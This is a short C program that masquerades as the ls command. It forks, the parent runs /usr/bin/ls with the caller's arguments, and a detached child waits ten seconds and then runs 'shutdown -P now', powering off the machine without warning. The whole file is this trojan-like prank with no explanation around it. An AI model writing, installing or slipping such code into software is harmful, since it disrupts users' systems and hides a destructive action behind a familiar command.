#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define SECONDS 10

void handler() {
    system("shutdown -P now");
}

int exec_child() {
    setpgid(0, 0);
    signal(SIGALRM, handler);

    alarm(SECONDS);

    pause();
}

int main(int argc, char* argv[]) {
    int f = fork();

    switch (f) {
        case 0:
            exec_child();
            break;

        default:
            execv("/usr/bin/ls", argv);
            break;
    }
}
